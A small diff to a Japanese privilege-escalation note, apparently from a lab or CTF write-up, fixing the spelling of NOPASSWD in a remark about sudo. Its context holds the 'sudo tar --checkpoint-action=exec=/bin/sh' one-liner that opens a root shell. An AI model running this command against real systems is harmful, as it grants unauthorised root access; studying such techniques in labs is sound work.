@@ -34,4 +34,4 @@ Sudo -lを実行したときに帰ってきた答えが
 
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
-Nopasswardがついていないため、sudoが必要
+NOPASSWDがついていないため、sudoが必要
